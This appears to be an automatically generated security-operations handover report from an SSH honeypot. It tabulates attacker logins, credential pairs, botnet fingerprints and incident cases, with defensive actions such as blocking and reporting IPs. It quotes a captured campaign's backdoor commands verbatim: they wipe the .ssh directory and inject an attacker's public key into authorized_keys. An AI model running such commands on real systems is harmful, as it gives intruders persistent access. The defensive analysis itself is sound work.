# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-08-04 |
| **Generated At** | 2026-08-04T19:44:11Z |
| **Shift Time** | 19:44 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **141** |
| Confirmed Threats | **120** |
| False Positives Filtered | **21** (14.9%) |
| Unique Attacker IPs | **66** |
| Countries of Origin | **26** |
| High Severity Cases | **87** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **54** |
| Malware Samples Analyzed | **3** HIGH · **27** MED · 16 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **99** |
| Unique Credential Pairs | **78** |
| Unique Usernames | **23** |
| Unique Passwords | **70** |
| Successful Auth Pairs | **90** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 63 |
| `support` | 5 |
| `monitor` | 3 |
| `admin` | 3 |
| `ubuntu` | 2 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `admin` | 7 |
| `LeitboGi0ro` | 5 |
| `password` | 3 |
| `123@@@` | 3 |
| `support` | 3 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `root` | `LeitboGi0ro` | 5 |
| `monitor` | `admin` | 3 |
| `root` | `123@@@` | 3 |
| `support` | `support` | 3 |
| `root` | `a123456789` | 3 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `USERID` | `PASSW0RD` | `31.173.2.182` | 2026-08-04T16:55:14 |
| `bitcoin` | `bitcoin` | `45.148.10.240` | 2026-08-04T16:56:56 |
| `pool` | `pool` | `45.148.10.240` | 2026-08-04T16:58:52 |
| `miner` | `miner` | `45.148.10.240` | 2026-08-04T17:00:43 |
| `root` | `admin` | `164.92.109.155` | 2026-08-04T17:01:45 |
| `ibkr` | `ibkr` | `45.148.10.240` | 2026-08-04T17:02:37 |
| `support` | `1962` | `110.25.109.54` | 2026-08-04T17:03:22 |
| `support` | `1962` | `186.239.41.74` | 2026-08-04T17:03:30 |
| `ibkrpro` | `ibkrpro` | `45.148.10.240` | 2026-08-04T17:04:31 |
| `root` | `ibkr` | `45.148.10.240` | 2026-08-04T17:06:20 |
| `operator` | `operator` | `45.156.87.192` | 2026-08-04T17:06:29 |
| `root` | `broker` | `45.148.10.240` | 2026-08-04T17:08:08 |
| `root` | `admin` | `45.148.10.240` | 2026-08-04T17:10:04 |
| `monitor` | `admin` | `10.0.0.73` | 2026-08-04T17:12:04 |
| `monitor` | `admin` | `34.146.217.105` | 2026-08-04T17:13:46 |
| `root` | `password` | `45.148.10.240` | 2026-08-04T17:15:49 |
| `root` | `1234` | `45.148.10.240` | 2026-08-04T17:17:48 |
| `root` | `admin123` | `45.148.10.240` | 2026-08-04T17:19:40 |
| `ubuntu` | `secret` | `102.220.160.67` | 2026-08-04T17:20:13 |
| `root` | `justforme` | `130.12.182.107` | 2026-08-04T17:20:54 |
| `root` | `toor` | `45.148.10.240` | 2026-08-04T17:21:34 |
| `root` | `LeitboGi0ro` | `129.153.145.135` | 2026-08-04T17:22:32 |
| `root` | `123@@@` | `129.153.145.135` | 2026-08-04T17:22:34 |
| `root` | `smo@@kkklss` | `129.153.145.135` | 2026-08-04T17:22:35 |
| `root` | `root123` | `45.148.10.240` | 2026-08-04T17:23:32 |
| `root` | `12345678` | `45.148.10.240` | 2026-08-04T17:25:24 |
| `root` | `123@@@` | `146.56.164.20` | 2026-08-04T17:25:37 |
| `root` | `LeitboGi0ro` | `146.56.164.20` | 2026-08-04T17:25:39 |
| `root` | `1` | `45.148.10.240` | 2026-08-04T17:27:15 |
| `root` | `2405` | `93.152.221.206` | 2026-08-04T17:28:54 |
| `root` | `12345` | `45.148.10.240` | 2026-08-04T17:29:12 |
| `root` | `abcd1234` | `45.148.10.240` | 2026-08-04T17:31:07 |
| `root` | `default` | `45.148.10.240` | 2026-08-04T17:32:59 |
| `support` | `support` | `176.53.159.196` | 2026-08-04T17:34:01 |
| `root` | `1qaz@WSX` | `45.148.10.240` | 2026-08-04T17:34:58 |
| `root` | `test` | `45.148.10.240` | 2026-08-04T17:36:59 |
| `minecraft` | `minecraft` | `118.26.153.102` | 2026-08-04T17:37:42 |
| `root` | `abc123` | `45.148.10.240` | 2026-08-04T17:38:54 |
| `root` | `111111` | `45.148.10.240` | 2026-08-04T17:40:50 |
| `root` | `R00t` | `179.184.85.167` | 2026-08-04T17:42:32 |
| `root` | `pass` | `45.148.10.240` | 2026-08-04T17:42:48 |
| `root` | `123` | `45.148.10.240` | 2026-08-04T17:44:42 |
| `root` | `qwerty` | `45.148.10.240` | 2026-08-04T17:46:36 |
| `12qwaszx` | `12qwaszx` | `10.0.0.73` | 2026-08-04T17:46:44 |
| `root` | `password` | `130.12.182.231` | 2026-08-04T17:47:12 |
| `12qwaszx` | `12qwaszx` | `113.219.177.95` | 2026-08-04T17:48:29 |
| `root` | `123456789` | `45.148.10.240` | 2026-08-04T17:48:35 |
| `admin` | `admin` | `10.0.0.73` | 2026-08-04T17:49:30 |
| `root` | `1q2w3e4r` | `45.148.10.240` | 2026-08-04T17:50:34 |
| `root` | `5tgbnhy67ujm` | `130.12.182.107` | 2026-08-04T17:51:20 |
| `root` | `ubuntu` | `45.148.10.240` | 2026-08-04T17:52:32 |
| `root` | `server` | `45.148.10.240` | 2026-08-04T17:54:35 |
| `root` | `root1234` | `45.148.10.240` | 2026-08-04T17:56:37 |
| `username` | `password` | `102.220.160.29` | 2026-08-04T17:58:08 |
| `root` | `raspberry` | `45.148.10.240` | 2026-08-04T17:58:32 |
| `support` | `support` | `10.0.0.73` | 2026-08-04T17:59:22 |
| `admin` | `admin2007` | `10.0.0.73` | 2026-08-04T17:59:43 |
| `root` | `qwe123` | `45.148.10.240` | 2026-08-04T18:00:31 |
| `root` | `q1w2e3r4` | `45.148.10.240` | 2026-08-04T18:02:30 |
| `root` | `123123` | `45.148.10.240` | 2026-08-04T18:04:25 |
| `root` | `P@ssw0rd` | `45.148.10.240` | 2026-08-04T18:06:22 |
| `root` | `123qweasd` | `45.148.10.240` | 2026-08-04T18:08:22 |
| `root` | `rootroot` | `45.148.10.240` | 2026-08-04T18:10:18 |
| `root` | `LeitboGi0ro` | `64.110.90.250` | 2026-08-04T18:11:45 |
| `root` | `123@@@` | `64.110.90.250` | 2026-08-04T18:11:45 |
| `router` | `adminpwla` | `181.212.174.164` | 2026-08-04T18:12:03 |
| `router` | `adminpwla` | `111.70.22.154` | 2026-08-04T18:12:12 |
| `root` | `1qaz2wsx` | `45.148.10.240` | 2026-08-04T18:12:16 |
| `root` | `qwer1234` | `45.148.10.240` | 2026-08-04T18:14:20 |
| `root` | `test123` | `45.148.10.240` | 2026-08-04T18:16:19 |
| `vboxuser` | `12345678` | `94.26.106.19` | 2026-08-04T18:18:08 |
| `root` | `sysadmin` | `45.148.10.240` | 2026-08-04T18:18:16 |
| `root` | `ktjybl` | `102.220.160.47` | 2026-08-04T18:19:11 |
| `root` | `root@123` | `45.148.10.240` | 2026-08-04T18:20:17 |
| `CONNECT 94.26.106.199:80 HTTP/1.0` | `Host: 94.26.106.199:80` | `94.26.106.199` | 2026-08-04T18:20:33 |
| `adm` | `123456` | `130.12.182.107` | 2026-08-04T18:22:05 |
| `root` | `a123456789` | `60.172.41.103` | 2026-08-04T18:22:24 |
| `root` | `1a2s3d` | `10.0.0.73` | 2026-08-04T18:27:43 |
| `certftp` | `certftp` | `103.91.246.101` | 2026-08-04T18:38:12 |
| `gitlab-runner` | `123` | `92.207.4.157` | 2026-08-04T18:38:17 |
| `345gs5662d34` | `345gs5662d34` | `103.91.246.101` | 2026-08-04T18:38:17 |
| `345gs5662d34` | `345gs5662d34` | `92.207.4.157` | 2026-08-04T18:38:20 |
| `certftp` | `3245gs5662d34` | `103.91.246.101` | 2026-08-04T18:38:20 |
| `gitlab-runner` | `3245gs5662d34` | `92.207.4.157` | 2026-08-04T18:38:21 |
| `alex` | `alex` | `207.254.22.207` | 2026-08-04T18:39:26 |
| `root` | `test2018` | `45.156.87.182` | 2026-08-04T18:43:25 |
| `root` | `2wsx#EDC` | `130.12.182.223` | 2026-08-04T18:47:31 |
| `root` | `a123456789` | `117.158.160.42` | 2026-08-04T18:51:45 |
| `root` | `a123456789` | `122.187.226.21` | 2026-08-04T18:51:58 |
| `ubuntu` | `ubuntu2023@` | `130.12.182.225` | 2026-08-04T18:53:07 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **141** |
| Sessions with Fingerprint | **9** |
| Unique HASSH Fingerprints | **9** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| Go SSH scanner | 46 |
| libssh | 25 |
| OpenSSH | 14 |
| Paramiko (Python) | 9 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `16443846184e...` | Generic scanner | 44 | 1 |
| `acaa53e0a7d7...` | Mirai/variant | 14 | 14 |
| `a591c4ddccc9...` | Mirai/variant | 13 | 11 |
| `f555226df196...` | Mirai/variant | 6 | 2 |
| `a2de0f306611...` | Mirai/variant | 5 | 2 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `16443846184e...` | Go SSH scanner | 44 | 1 | Generic scanner |
| `acaa53e0a7d7...` | OpenSSH | 14 | 14 | Mirai/variant |
| `a591c4ddccc9...` | libssh | 13 | 11 | Mirai/variant |
| `f555226df196...` | libssh | 6 | 2 | Mirai/variant |
| `95420f9d932d...` | libssh | 5 | 1 | — |
| `a2de0f306611...` | Paramiko (Python) | 5 | 2 | Mirai/variant |
| `6372ee695756...` | Paramiko (Python) | 4 | 1 | Modern SSH client |
| `eff4c24daffc...` | Go SSH scanner | 2 | 1 | Modern SSH client |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **4** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 2 | 2 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `103.91.246.101`, `92.207.4.157`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **66** |
| Unique ASNs | **50** |
| High-Risk ASNs | **30** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS197769` | VPS Dedicated LLC | 7 | HIGH |
| `AS197170` | TechTies Inc. | 5 | HIGH |
| `AS31898` | Oracle Corporation | 3 | HIGH |
| `AS46562` | Performive LLC | 3 | MEDIUM |
| `AS48721` | Flyservers S.A. | 2 | HIGH |
| `AS22773` | Cox Communications Inc. | 2 | MEDIUM |
| `AS58224` | Iran Telecommunication Company PJS | 1 | LOW |
| `AS50581` | Ukrainian Telecommunication Group LLC | 1 | LOW |

---

---

## 🚨 Priority Cases — Immediate Attention (87)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-34d46eff044c

| Field | Detail |
|---|---|
| **Source IP** | `31.173.2[.]182` |
| **First Seen** | 2026-08-04 16:55 |
| **Last Seen** | 2026-08-04 16:55 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 16:55:12` | `cowrie.session.connect` |
| `2026-08-04 16:55:12` | `cowrie.client.version` |
| `2026-08-04 16:55:12` | `cowrie.client.kex` |
| `2026-08-04 16:55:14` | `cowrie.login.success` |
| `2026-08-04 16:55:15` | `cowrie.direct-tcpip.request` |
| `2026-08-04 16:55:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `31.173.2[.]182` to AbuseIPDB if not already reported
- [ ] Block `31.173.2[.]182` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-16f9f3f057e8

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-04 16:56 |
| **Last Seen** | 2026-08-04 16:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 16:56:56` | `cowrie.session.connect` |
| `2026-08-04 16:56:56` | `cowrie.client.version` |
| `2026-08-04 16:56:56` | `cowrie.client.kex` |
| `2026-08-04 16:56:56` | `cowrie.login.success` |
| `2026-08-04 16:56:57` | `cowrie.session.params` |
| `2026-08-04 16:56:57` | `cowrie.command.input` |
| `2026-08-04 16:56:57` | `cowrie.log.closed` |
| `2026-08-04 16:56:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-74253b8a1c86

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-04 16:58 |
| **Last Seen** | 2026-08-04 16:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 16:58:52` | `cowrie.session.connect` |
| `2026-08-04 16:58:52` | `cowrie.client.version` |
| `2026-08-04 16:58:52` | `cowrie.client.kex` |
| `2026-08-04 16:58:52` | `cowrie.login.success` |
| `2026-08-04 16:58:53` | `cowrie.session.params` |
| `2026-08-04 16:58:53` | `cowrie.command.input` |
| `2026-08-04 16:58:53` | `cowrie.log.closed` |
| `2026-08-04 16:58:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-35598cf43cb9

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-04 17:00 |
| **Last Seen** | 2026-08-04 17:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 17:00:43` | `cowrie.session.connect` |
| `2026-08-04 17:00:43` | `cowrie.client.version` |
| `2026-08-04 17:00:43` | `cowrie.client.kex` |
| `2026-08-04 17:00:43` | `cowrie.login.success` |
| `2026-08-04 17:00:44` | `cowrie.session.params` |
| `2026-08-04 17:00:44` | `cowrie.command.input` |
| `2026-08-04 17:00:44` | `cowrie.log.closed` |
| `2026-08-04 17:00:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4ed26b477c53

| Field | Detail |
|---|---|
| **Source IP** | `164.92.109[.]155` |
| **First Seen** | 2026-08-04 17:01 |
| **Last Seen** | 2026-08-04 17:02 |
| **Session Duration** | 25s |
| **Login Attempts** | 2 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/ip cloud print, ifconfig, uname -a, cat /proc/cpuinfo, ps | grep '[Mm]iner'` |
| **TTPs (MITRE)** | T1057 · T1078 · T1083 · T1110.001 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 17:01:43` | `cowrie.session.connect` |
| `2026-08-04 17:01:43` | `cowrie.client.version` |
| `2026-08-04 17:01:43` | `cowrie.client.kex` |
| `2026-08-04 17:01:43` | `cowrie.login.failed` |
| `2026-08-04 17:01:45` | `cowrie.login.success` |
| `2026-08-04 17:01:46` | `cowrie.session.params` |
| `2026-08-04 17:01:46` | `cowrie.command.input` |
| `2026-08-04 17:01:46` | `cowrie.command.failed` |
| `2026-08-04 17:01:46` | `cowrie.log.closed` |
| `2026-08-04 17:01:46` | `cowrie.session.params` |
| `2026-08-04 17:01:46` | `cowrie.command.input` |
| `2026-08-04 17:01:47` | `cowrie.log.closed` |
| `2026-08-04 17:01:47` | `cowrie.session.params` |
| `2026-08-04 17:01:47` | `cowrie.command.input` |
| `2026-08-04 17:01:47` | `cowrie.log.closed` |
| `2026-08-04 17:01:48` | `cowrie.session.params` |
| `2026-08-04 17:01:48` | `cowrie.command.input` |
| `2026-08-04 17:01:48` | `cowrie.log.closed` |
| `2026-08-04 17:01:49` | `cowrie.session.params` |
| `2026-08-04 17:01:49` | `cowrie.command.input` |
| `2026-08-04 17:01:49` | `cowrie.log.closed` |
| `2026-08-04 17:01:50` | `cowrie.session.params` |
| `2026-08-04 17:01:50` | `cowrie.command.input` |
| `2026-08-04 17:01:50` | `cowrie.log.closed` |
| `2026-08-04 17:01:51` | `cowrie.session.params` |
| `2026-08-04 17:01:51` | `cowrie.command.input` |
| `2026-08-04 17:01:51` | `cowrie.log.closed` |
| `2026-08-04 17:01:51` | `cowrie.session.params` |
| `2026-08-04 17:01:51` | `cowrie.command.input` |
| `2026-08-04 17:01:52` | `cowrie.log.closed` |
| `2026-08-04 17:01:52` | `cowrie.session.params` |
| `2026-08-04 17:01:52` | `cowrie.command.input` |
| `2026-08-04 17:01:53` | `cowrie.log.closed` |
| `2026-08-04 17:02:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `164.92.109[.]155` to AbuseIPDB if not already reported
- [ ] Block `164.92.109[.]155` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6d9d084b8e06

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-04 17:02 |
| **Last Seen** | 2026-08-04 17:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 17:02:37` | `cowrie.session.connect` |
| `2026-08-04 17:02:37` | `cowrie.client.version` |
| `2026-08-04 17:02:37` | `cowrie.client.kex` |
| `2026-08-04 17:02:37` | `cowrie.login.success` |
| `2026-08-04 17:02:38` | `cowrie.session.params` |
| `2026-08-04 17:02:38` | `cowrie.command.input` |
| `2026-08-04 17:02:38` | `cowrie.log.closed` |
| `2026-08-04 17:02:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-71c700f588d9

| Field | Detail |
|---|---|
| **Source IP** | `110.25.109[.]54` |
| **First Seen** | 2026-08-04 17:03 |
| **Last Seen** | 2026-08-04 17:03 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 17:03:20` | `cowrie.session.connect` |
| `2026-08-04 17:03:21` | `cowrie.client.version` |
| `2026-08-04 17:03:21` | `cowrie.client.kex` |
| `2026-08-04 17:03:22` | `cowrie.login.success` |
| `2026-08-04 17:03:23` | `cowrie.direct-tcpip.request` |
| `2026-08-04 17:03:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `110.25.109[.]54` to AbuseIPDB if not already reported
- [ ] Block `110.25.109[.]54` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-64dfd809f0a0

| Field | Detail |
|---|---|
| **Source IP** | `186.239.41[.]74` |
| **First Seen** | 2026-08-04 17:03 |
| **Last Seen** | 2026-08-04 17:03 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 17:03:28` | `cowrie.session.connect` |
| `2026-08-04 17:03:28` | `cowrie.client.version` |
| `2026-08-04 17:03:28` | `cowrie.client.kex` |
| `2026-08-04 17:03:30` | `cowrie.login.success` |
| `2026-08-04 17:03:31` | `cowrie.direct-tcpip.request` |
| `2026-08-04 17:03:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.239.41[.]74` to AbuseIPDB if not already reported
- [ ] Block `186.239.41[.]74` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aa48b8fd8b27

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-04 17:04 |
| **Last Seen** | 2026-08-04 17:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 17:04:31` | `cowrie.session.connect` |
| `2026-08-04 17:04:31` | `cowrie.client.version` |
| `2026-08-04 17:04:31` | `cowrie.client.kex` |
| `2026-08-04 17:04:31` | `cowrie.login.success` |
| `2026-08-04 17:04:32` | `cowrie.session.params` |
| `2026-08-04 17:04:32` | `cowrie.command.input` |
| `2026-08-04 17:04:32` | `cowrie.log.closed` |
| `2026-08-04 17:04:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ce56bbd35f8f

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-04 17:06 |
| **Last Seen** | 2026-08-04 17:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 17:06:20` | `cowrie.session.connect` |
| `2026-08-04 17:06:20` | `cowrie.client.version` |
| `2026-08-04 17:06:20` | `cowrie.client.kex` |
| `2026-08-04 17:06:20` | `cowrie.login.success` |
| `2026-08-04 17:06:21` | `cowrie.session.params` |
| `2026-08-04 17:06:21` | `cowrie.command.input` |
| `2026-08-04 17:06:21` | `cowrie.log.closed` |
| `2026-08-04 17:06:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9a5577d6cd27

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]192` |
| **First Seen** | 2026-08-04 17:06 |
| **Last Seen** | 2026-08-04 17:06 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 17:06:28` | `cowrie.session.connect` |
| `2026-08-04 17:06:28` | `cowrie.client.version` |
| `2026-08-04 17:06:28` | `cowrie.client.kex` |
| `2026-08-04 17:06:29` | `cowrie.login.success` |
| `2026-08-04 17:06:29` | `cowrie.direct-tcpip.request` |
| `2026-08-04 17:06:29` | `cowrie.direct-tcpip.data` |
| `2026-08-04 17:06:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]192` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]192` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1e9f4d20cdc0

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-04 17:08 |
| **Last Seen** | 2026-08-04 17:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 17:08:08` | `cowrie.session.connect` |
| `2026-08-04 17:08:08` | `cowrie.client.version` |
| `2026-08-04 17:08:08` | `cowrie.client.kex` |
| `2026-08-04 17:08:08` | `cowrie.login.success` |
| `2026-08-04 17:08:09` | `cowrie.session.params` |
| `2026-08-04 17:08:09` | `cowrie.command.input` |
| `2026-08-04 17:08:09` | `cowrie.log.closed` |
| `2026-08-04 17:08:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bd50321d6c42

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-04 17:10 |
| **Last Seen** | 2026-08-04 17:10 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 17:10:04` | `cowrie.session.connect` |
| `2026-08-04 17:10:04` | `cowrie.client.version` |
| `2026-08-04 17:10:04` | `cowrie.client.kex` |
| `2026-08-04 17:10:04` | `cowrie.login.success` |
| `2026-08-04 17:10:05` | `cowrie.session.params` |
| `2026-08-04 17:10:05` | `cowrie.command.input` |
| `2026-08-04 17:10:05` | `cowrie.log.closed` |
| `2026-08-04 17:10:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-887cf79eb1c9

| Field | Detail |
|---|---|
| **Source IP** | `34.146.217[.]105` |
| **First Seen** | 2026-08-04 17:13 |
| **Last Seen** | 2026-08-04 17:13 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
